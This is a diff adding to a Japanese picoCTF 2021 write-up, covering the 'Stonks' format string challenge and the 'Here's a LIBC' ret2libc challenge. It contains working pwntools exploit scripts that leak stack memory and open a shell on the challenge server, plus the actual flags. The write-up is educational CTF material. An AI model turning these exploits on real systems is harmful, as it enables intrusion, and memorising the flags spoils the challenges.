@@ -5,7 +5,7 @@ lastmod: 2021-04-10T19:00:00+09:00
 draft: false
 keywords: []
 description: ""
-tags: ["CTF"]
+tags: ["CTF", "Reviewed"]
 categories: ["CTF"]
 author: ""
 ---
@@ -15,7 +15,9 @@ author: ""
 </a>
 {{% /right %}}
 
-URL: [https://play.picoctf.org/events/34](https://play.picoctf.org/events/34)
+(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。)
+
+URL: [https://play.picoctf.org/practice](https://play.picoctf.org/practice)
 
 
 <table><tr><td>
@@ -41,10 +43,12 @@ URL: [https://play.picoctf.org/events/34](https://play.picoctf.org/events/34)
 
 以下が解いたチャレンジの状況です。Binaryがほとんど手付かずでした。
 
+[Web] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web.png" alt="picoctf_2021_web.png">
 
 <br />
 
+[Crypto] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto1.png" alt="picoctf_2021_crypto1.png">
 
 <br />
@@ -53,18 +57,22 @@ URL: [https://play.picoctf.org/events/34](https://play.picoctf.org/events/34)
 
 <br />
 
+[Reverse] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_rev.png" alt="picoctf_2021_rev.png">
 
 <br />
 
+[Forensics] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_forensic.png" alt="picoctf_2021_forensic.png">
 
 <br />
 
+[General Skills] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_general.png" alt="picoctf_2021_general.png">
 
 <br />
 
+[Binary] <br />
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_binary.png" alt="picoctf_2021_binary.png">
 
 
@@ -1327,6 +1335,348 @@ Hint: What version of python am I running?
 
 Flag: `picoCTF{v4lua4bl3_1npu7_7607377}`
 
+
+
+<br /><br />
+<br /><br />
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はイベント終了後に行った復習です。
+
+
+<br /><br />
+<br /><br />
+## [Binary]: Stonks (20 points)
+- - -
+### Challenge
+> I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!
+<br /><br />
+Hint: Okay, maybe I'd believe you if you find my API key.
+
+Attachment:
+
+- vuln.c
+
+
+<br />
+### Solution
+malloc()とかfree()とかあったので、double-freeとかそこら辺かと思ってスルーしてたんですけど、書式文字列攻撃（Format string bug）でしたね。
+
+{{< highlight c "linenos=table,hl_lines=32" >}}
+int buy_stonks(Portfolio *p) {
+	if (!p) {
+		return 1;
+	}
+	char api_buf[FLAG_BUFFER];
+	FILE *f = fopen("api","r");
+	if (!f) {
+		printf("Flag file not found. Contact an admin.\n");
+		exit(1);
+	}
+	fgets(api_buf, FLAG_BUFFER, f);
+
+	int money = p->money;
+	int shares = 0;
+	Stonk *temp = NULL;
+	printf("Using patented AI algorithms to buy stonks\n");
+	while (money > 0) {
+		shares = (rand() % money) + 1;
+		temp = pick_symbol_with_AI(shares);
+		temp->next = p->head;
+		p->head = temp;
+		money -= shares;
+	}
+	printf("Stonks chosen\n");
+
+	// TODO: Figure out how to read token from file, for now just ask
+
+	char *user_buf = malloc(300 + 1);
+	printf("What is your API token?\n");
+	scanf("%300s", user_buf);
+	printf("Buying stonks with token:\n");
+	printf(user_buf);
+
+	// TODO: Actually use key to interact with API
+
+	view_portfolio(p);
+
+	return 0;
+}
+{{< / highlight >}}
+
+<br />
+
+まずは、繋いでみて動作を確認します。
+
+<pre>
+$ nc mercury.picoctf.net 53437
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+Buying stonks with token:
+AAAA0x9c62450.0x804b000.0x80489c3.0xf7fadd80.0xffffffff.0x1.0x9c60160.0xf7fbb110.0xf7faddc7.(nil).0x9c61180.0x1.0x9c62430.0x9c62450.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x34636462.0x61653532.0xffd5007d.0xf7fe8af8.0xf7fbb440.0x70bab900.0x1.(nil).0xf7e4abe9.0xf7fbc0c0.0xf7fad5c0.0xf7fad000.0xffd54508.0xf7e3b58d.0xf7fad5c0.0x8048eca
+Portfolio as of Sun May 30 02:45:13 UTC 2021
+</pre>
+
+<br />
+
+書いたコード：
+
+```Python
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+context.log_level = 'critical'
+
+host, port = 'mercury.picoctf.net', 53437
+
+for i in range(15,25):
+    s = remote(host, port)
+    s.recvuntil('2) View my portfolio')
+    s.sendline('1')
+    s.recvuntil('What is your API token?\n')
+    s.sendline('%' + str(i) + '$p')
+    s.recvuntil('Buying stonks with token:\n')
+    response = s.recvline()
+    try:
+        if "0x" in response:
+            r = response.rstrip() # To remove '\n'
+            # print(r)
+            sys.stdout.write(p32(int(r,16)))
+    except:
+        print("{}".format("error"))
+        pass
+    s.close()
+print()
+```
+
+<br />
+実行結果：
+
+<pre>
+$ ./stonks_solve.py
+picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}\x00\xff()
+</pre>
+
+
+<br />
+
+Flag: `picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}`
+
+
+
+<br /><br />
+<br /><br />
+## [Binary]: Here's a LIBC (90 points)
+- - -
+### Challenge
+> I am once again asking for you to pwn this binary.
+<br /><br />
+Hint: PWNTools has a lot of useful features for getting offsets.
+
+Attachment:
+
+- vuln (ELF 64bit)
+- libc.so.6
+- Makefile
+
+
+<br />
+### Solution
+
+まずは、Ghidraでコードを確認します。
+
+main() では大したことをやっていないので、省略します。以下の do_stuff() がキーになる箇所です。
+
+```C
+void do_stuff(void)
+
+{
+  char cVar1;
+  undefined local_89;
+  char local_88 [112];
+  undefined8 local_18;
+  ulong local_10;
+  
+  local_18 = 0;
+  __isoc99_scanf("%[^\n]",local_88);
+  __isoc99_scanf(&DAT_0040093a,&local_89);
+  local_10 = 0;
+  while (local_10 < 100) {
+    cVar1 = convert_case((int)local_88[local_10],local_10,local_10);
+    local_88[local_10] = cVar1;
+    local_10 = local_10 + 1;
+  }
+  puts(local_88);
+  return;
+}
+```
+
+<br />
+checksecも確認。
+
+<pre>
+$ checksec vuln
+[*] '/home/captureamerica/OneDrive/CTF/picoCTF_2021/Binary/Heres_a_libc/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  './'
+</pre>
+
+<br />
+実際に繋いでみて、動作確認。入力した文字列を所々大文字にして表示するようです。
+
+<pre>
+$ nc mercury.picoctf.net 49464
+WeLcOmE To mY EcHo sErVeR!
+hoge
+HoGe
+fuga
+FuGa
+</pre>
+
+<br />
+まずはオフセットをゲットしようと思ったんですが、Kaliではもらったバイナリが動きませんでした。
+
+<pre>
+$ ./vuln
+Segmentation fault
+</pre>
+
+ということで、gdbも当然うごかなかったです。
+
+<br />
+
+ちょっとズルして、他のwriteupから136バイトなのを確認。
+
+<br />
+
+書いたコード (その１)
+
+{{< highlight c "linenos=table,hl_lines=36" >}}
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+context(os='linux', arch='amd64')
+context.log_level = 'critical'
+
+host, port = 'mercury.picoctf.net', 49464
+s = remote(host, port)
+elf = ELF('./vuln')
+
+ret = next(elf.search(asm('ret')))
+pop_rdi = next(elf.search(asm('pop rdi; ret')))
+got_puts = elf.got["puts"]
+plt_puts = elf.plt["puts"]
+addr_main = elf.symbols["main"]
+
+libc = ELF('./libc.so.6')
+off_puts = libc.symbols["puts"]
+
+bufsize = 112 + 24
+payload = "A" * bufsize
+payload += p64(pop_rdi)
+payload += p64(got_puts)
+payload += p64(plt_puts)
+payload += p64(addr_main)      # return to main
+s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n",payload)
+s.recvuntil('\n')
+
+libc_puts = u64(s.recv(6) + "\x00\x00")
+libc_base = libc_puts - off_puts
+libc.address = libc_base
+print hex(libc_base)
+
+payload = "A" * bufsize
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(libc.search(b'/bin/sh').next())
+payload += p64(libc.sym.system)
+    
+s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n",payload)
+s.recvuntil('\n')
+s.interactive()	
+{{< / highlight >}}
+
+
+<br />
+ハイライト部分でretを入れているのは、おそらく16バイトアラインメントです。
+
+{{% admonition quote "quote" %}}
+ret命令を一度呼び出しスタックを8バイトずらせば、system関数を呼び出しても動作します。（Kusanoさんの「例題pwnable」より）
+{{% /admonition %}}
+
+<br />
+
+書いたコード (その２)
+
+```Python
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+from pwn import *
+context(os='linux', arch='amd64')
+context.log_level = 'critical'
+
+elf = ELF('./vuln')
+context.binary = elf
+
+s = remote('mercury.picoctf.net', 49464)
+
+rop = ROP(elf)
+rop.puts(elf.got.puts)
+rop.main()
+print(rop.dump())
+s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", b'A'*136 + rop.chain())
+s.recvuntil('\n')
+puts = u64(s.recvline().rstrip().ljust(8, b"\x00"))
+print('puts: %x' % puts)
+libc = ELF('./libc.so.6')
+libc.address = puts - libc.symbols.puts
+
+rop = ROP(libc)
+rop.execv(next(libc.search(b'/bin/sh')), 0)
+print(rop.dump())
+s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", b'A'*136 + rop.chain())
+s.recvuntil('\n')
+s.interactive()	
+```
+
+<br />
+
+動作結果：
+
+<pre>
+$ ./heresalibc_solve.py
+0x7fa997cbb000
+$ ls
+flag.txt
+libc.so.6
+vuln
+vuln.c
+xinet_startup.sh
+$ cat flag.txt
+picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}
+</pre>
+
+<br />
+
+Flag: `picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}`
+
+
+<br />
 
 
 
